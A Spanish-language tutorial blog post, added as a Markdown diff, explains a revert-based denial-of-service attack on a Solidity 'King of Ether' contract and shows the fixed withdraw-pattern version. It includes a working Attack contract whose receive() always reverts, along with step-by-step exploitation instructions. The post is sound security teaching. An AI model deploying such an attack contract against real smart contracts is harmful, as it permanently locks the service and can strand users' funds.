@@ -1,0 +1,155 @@
+---
+title: 'Solidity: Ataque DoS por reversión'
+description: 'Los contratos inteligentes pueden ser víctimas de ataques de denegación de servicios y bloqueados de tal manera que se pierdan millones de dólares y no puedan recuperarse jamás.'
+pubDate: '06/01/2023'
+englishMetadata: {
+  title: 'Solidity: Revert DoS Attack',
+  description: 'Smart contracts can be victims of denial-of-service attacks and blocked in such a way that millions of dollars are lost and can never be recovered.'
+}
+---
+
+# Solidity: Ataque DoS por reversión
+
+Es conocido en el mundo de la informática los Ataque de Denegación de Servicios o **DoS**. Los mismos **interrumpen de forma total o parcial un servicio** como un servidor web, un servidor de base de datos o algún tipo de red donde se intercambia información.
+
+## DoS en Blockchain
+
+Blockchain no es la excepción, los contratos inteligentes pueden ser víctimas de este tipo de ataques. Los contratos pueden quedar bloqueados de tal manera que **se pierdan millones de dólares y no puedan recuperarse jamás**.
+
+Veamos de qué se trata esta vulnerabilidad y cómo prevenirla a través de un simple ejemplo:
+
+### Explicación del contrato vulnerado
+
+Utilizaremos un contrato inteligente de un juego cuyo objetivo es convertirse en el "Rey" enviando más ETH que el Rey anterior. El Rey destronado recuperará su ETH al perder el trono. La vulnerabilidad provocará que el contrato inteligente quede inutilizable para siempre y que nadie más pueda proclamarse Rey.
+
+> **NOTA:** El ejemplo de esta vulnerabilidad fue tomado y adaptado originalmente de [Solidity by examples](https://solidity-by-example.org/hacks/denial-of-service/).
+
+### Contratos involucrados
+
+Comencemos analizando el contrato del juego que será vulnerado. Su función `claimThrone()` es la encargada de toda la lógica del mismo.
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+contract KingOfEther {
+  address public king;
+  uint public balance;
+
+  function claimThrone() external payable {
+    require(msg.value > balance, "Need to pay more to become the king");
+
+    // Devolvemos ETH al Rey destronado
+    (bool sent, ) = king.call{value: balance}("");
+    require(sent, "Failed to send Ether");
+
+    // Seteamos al nuevo Rey
+    balance = msg.value;
+    king = msg.sender;
+  }
+}
+```
+
+Por su parte, el contrato atacante. Su función `receive()` es la responsable de denegar el servicio para siempre del otro contrato.
+
+```js
+contract Attack {
+  KingOfEther kingOfEther;
+
+  constructor(KingOfEther _kingOfEther) {
+    // Instanciamos KingOfEther con su dirección
+    kingOfEther = KingOfEther(_kingOfEther);
+  }
+
+  // Función que revertirá la transacción siempre que se intente devolver el ETH al contrato.
+  // Haciendo que nadie más pueda reclamar el trono.
+  receive() external payable {
+    revert();
+  }
+
+  // El ataque se origina cuando enviamos más ETH que el anterior Rey y el contrato Attack se convierte en el nuevo.
+  function attack() public payable {
+    kingOfEther.claimThrone{value: msg.value}();
+  }
+}
+```
+
+### Procedimiento para vulnerar el contrato
+
+1. Desplegar el contrato `KingOfEther`.
+2. Enviar 1 ETH con Alice a través de la función `claimThrone()`.
+2. Enviar 2 ETH con Bob a través de la función `claimThrone()`. Alice recupera 1 ETH y Bob es el nuevo Rey.
+3. Desplegar el contrato `Attack` que recibe por parámetro la dirección de `KingOfEther`.
+4. Realizar el llamado a `Attack.attack` con 3 ETH.
+5. El nuevo Rey será el contrato atacante y nadie más podrá reclamar el reinado.
+
+### ¿Qué sucedió aquí?
+
+`Attack` se convirtió en el nuevo Rey. Nadie más puede reclamar el trono debido a que, cuando el contrato `KingOfEther` intenta devolverle sus ETH al contrato atacante, el mismo responde con un `revert()` a través de su función `receive()`.
+
+El ataque genera que solo el contrato atacante pierda sus ETH, ya que el Rey destronado los recupera antes de setear como Rey al contrato atacante.
+
+Si bien, como hemos dicho, *"solo el contrato atacante pierde sus ETH"*, puede parecer un ataque sin ningún tipo de sentido, ya que es ocasionado solo por querer hacer daño a un proyecto y para que el contrato quede inutilizable. Aun así, existen escenarios donde también hay perdidas económicas de otros usuarios.
+
+### ¿Por qué sucedió?
+
+`KingOfEther` espera una respuesta positiva al realizar el `call()` y devolver los ETH a su respectivo dueño. El `revert()` del contrato atacante provoca que en cada llamado siempre ocurra un error y nunca pueda setearse un nuevo Rey.
+
+Cabe recalcar que la vulnerabilidad puede exponerse no solo a través de la función `receive()` más un `revert()`. Podría simplemente no existir una función `fallback()` en el contrato atacante y provocar el mismo daño de inutilizar el contrato vulnerado.
+
+### ¿Cómo se puede evitar?
+
+Observa la función principal de `KingOfEther`:
+
+```js
+function claimThrone() external payable {
+  require(msg.value > balance, "Necesitas pagar mas para ser el nuevo Rey.");
+
+  (bool sent, ) = king.call{value: balance}("");
+  require(sent, "El envio de ETH ha fallado.");
+
+  balance = msg.value;
+  king = msg.sender;
+}
+```
+
+La misma se encarga tanto de devolver los ETH a su dueño como de setear al nuevo Rey posteriormente.
+
+Esta vulnerabilidad puede evitarse haciendo una **división de responsabilidad**. Por un lado, la lógica para determinar al nuevo Rey. Por otro, el retiro de los ETH por parte de los usuarios que fueron destronados.
+
+```js
+contract KingOfEther {
+  address public king;
+  uint public balance;
+  mapping(address => uint) public balances;
+
+  function claimThrone() external payable {
+    require(msg.value > balance, "Necesitas pagar mas para ser el nuevo Rey.");
+    balances[king] += balance;
+    balance = msg.value;
+    king = msg.sender;
+  }
+
+  function withdraw() public {
+    require(msg.sender != king, "El Rey actual no puede retirar sus fondos.");
+    uint amount = balances[msg.sender];
+    balances[msg.sender] = 0;
+    (bool sent, ) = msg.sender.call{value: amount}("");
+    require(sent, "El envio de ETH ha fallado.");
+  }
+}
+```
+
+La administración de los balances de cada cuenta siempre es mejor realizarla con un `mapping`. La función `withdraw()` permitirá a los usuarios retirar su dinero (a excepción del Rey actual) y, por más que ocurra algún tipo de denegación, podrán recuperar sus ETH.
+
+Cada usuario es responsable de sus ETH. El retiro del mismo deben hacerlo ellos mismos y ya no será el propio contrato inteligente quien se encargue de devolvérselos.
+
+De esta forma, el ataque DoS solo afectará al mismo contrato atacado, quién será el único que no puede recuperar sus ETH.
+
+## Conclusiones
+
+Hay mucha gente que busca hacer daño allá afuera. Por más que ellos también salgan perjudicados económicamente. Buscan destruir un proyecto o comunidad que puede haber por detrás.
+Busca siempre las mejores prácticas a la hora de escribir código. Como en todo desarrollo de software, existen patrones de diseño recomendados para escribir código. El *Principio de Responsabilidad Única* del patrón SOLID también aplica para el desarrollo Web3.
+
+---
+Post creado en colaboración con el [Curso de Introducción a Seguridad de Smart Contracts](https://platzi.com/clases/2721-seguridad-smart-contracts/45718-denegacion-por-reversion/) de **Platzi**.
